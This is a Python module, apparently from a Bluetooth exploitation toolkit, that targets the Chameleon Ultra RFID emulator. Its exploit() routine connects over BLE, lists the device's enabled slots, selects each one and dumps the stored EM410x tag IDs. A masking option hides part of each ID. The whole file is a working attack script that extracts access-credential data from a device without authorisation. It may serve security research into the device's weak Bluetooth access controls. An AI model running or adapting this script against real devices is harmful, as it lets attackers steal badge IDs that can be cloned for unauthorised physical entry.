import struct
import asyncio
from enum import Enum
from ..utils.print_with_color import print_with_color

class ChameleonUltraCommand(Enum):
    SET_SLOT = 1003
    GET_ENABLED_SLOTS = 1023
    GET_EM410X_EMU_ID = 5001

class ChameleonUltraResponseStatus(Enum):
    LF_TAG_OK = 64
    LF_TAG_NOT_FOUND = 65
    PAR_ERR = 96
    DEVICE_MODE_ERROR = 102
    INVALID_CMD = 103
    DEVICE_SUCCESS = 104
    NOT_IMPLEMENTED = 105

class ChameleonUltra:

    DEFAULT_PIN = "123456"
    SERV_CHARACTERISTIC_UUID = "6e400001-b5a3-f393-e0a9-e50e24dcca9e"
    SEND_CHARACTERISTIC_UUID = "6e400002-b5a3-f393-e0a9-e50e24dcca9e"
    RECV_CHARACTERISTIC_UUID = "6e400003-b5a3-f393-e0a9-e50e24dcca9e"

    def __init__(self, client, mask=False):
        self.mask = mask
        self.client = client
        self.response_received = asyncio.Event()

    async def exploit(self):
        print_with_color("Dumping EM410x tags from Chameleon Ultra...", "green", "")
        print("")
        
        await self.client.start_notify(self.RECV_CHARACTERISTIC_UUID, self.handle_enabled_slots)
        await self.send_command(ChameleonUltraCommand.GET_ENABLED_SLOTS)
        await self.response_received.wait()

    async def handle_enabled_slots(self, _: int, data: bytearray):
        frame = ChameleonUltraFrame(data, mask=self.mask)
        if frame.status != ChameleonUltraResponseStatus.DEVICE_SUCCESS:
            print(f"[-] Failed to get enabled slots: {frame.status}")
            self.response_received.set()
            return

        active_slots = []
        for i in range(8):
            if frame.data[i] == 1:
                active_slots.append(i)
        
        if len(active_slots) == 0:
            print(f"[-] No active slots found")
            self.response_received.set()
            return

        await self.client.stop_notify(self.RECV_CHARACTERISTIC_UUID)
        print_with_color(f"Active slots: {active_slots}", "green", "[+]")

        def notification_handler(_: int, data: bytearray):
            frame = ChameleonUltraFrame(data, mask=self.mask)
            print_with_color(f"Received frame: {frame}", "green", "[+]")
        
        await self.client.start_notify(self.RECV_CHARACTERISTIC_UUID, notification_handler)
        await asyncio.sleep(0.1)

        for slot in active_slots:
            await self.send_command(ChameleonUltraCommand.SET_SLOT, bytearray([slot]))
            await self.send_command(ChameleonUltraCommand.GET_EM410X_EMU_ID)
            await asyncio.sleep(0.1)
        
        await asyncio.sleep(1)
        self.response_received.set()

    async def send_command(self, cmd: ChameleonUltraCommand, data = bytearray(), status = 0):
        data_str = data.hex() or "<empty>"
        print_with_color(f"Sending command {cmd} with data {data_str}...", "blue", "> ")
        try:
            # Replace these variables with your actual values
            command_code = cmd.value  # Replace with your actual command code
            data_buffer = data  # Replace with your actual data

            # Create command array (10 for header + length of data)
            command_array = bytearray(10 + len(data_buffer))
            command_array[0] = 0x11  # SOF1
            command_array[1] = 0xEF  # SOF2

            # Add Command
            command_array[2] = (command_code >> 8) & 0xFF  # High byte
            command_array[3] = command_code & 0xFF  # Low byte

            # Add Status (probably 0 if you are sending a command)
            command_array[4] = (status >> 8) & 0xFF  # High byte
            command_array[5] = status & 0xFF  # Low byte

            # Add Data Length
            data_length = len(data_buffer)
            command_array[6] = (data_length >> 8) & 0xFF  # High byte
            command_array[7] = data_length & 0xFF  # Low byte

            # Calculate and Add Head LRC
            head_bytes = bytearray(command_array[2:8])
            head_lrc = self.calc_lrc(head_bytes)  # Assume calc_lrc is defined
            command_array[8] = head_lrc

            # Add Data
            command_array[9:9+len(data_buffer)] = data_buffer

            # Calculate and Add Data LRC
            data_lrc = self.calc_lrc(bytearray(data_buffer))
            command_array[9 + len(data_buffer)] = data_lrc

            # Send the command
            await self.client.write_gatt_char(self.SEND_CHARACTERISTIC_UUID, command_array, True)
        except Exception as error:
            print_with_color(f"Failed to send command {cmd}: {error}", "red", "[-]")
            raise error
        
    def calc_lrc(self, buf):
        sum_ = 0
        for i in buf:
            sum_ += i
        return (0x100 - sum_) & 0xFF

class ChameleonUltraFrame:
    def __init__(self, data_view, mask = False):
        self.mask = mask
        self.data_view = data_view

    @property
    def cmd(self):
        return struct.unpack(">H", self.data_view[2:4])[0]  # ">H" for big-endian 2-byte unsigned int

    @property
    def status(self):
        status = struct.unpack(">H", self.data_view[4:6])[0]  # ">H" for big-endian 2-byte unsigned int
        return ChameleonUltraResponseStatus(status)
    
    @property
    def data(self):
        return self.data_view[9:-1]  # Excluding last byte
    
    def __str__(self):
        data_str = self.data.hex() or "<empty>"
        if data_str != "<empty>":
            if self.mask:
                data_str = data_str[:-6] + "******"

        return f"cmd: {self.cmd}, status: {self.status}, data: {data_str}"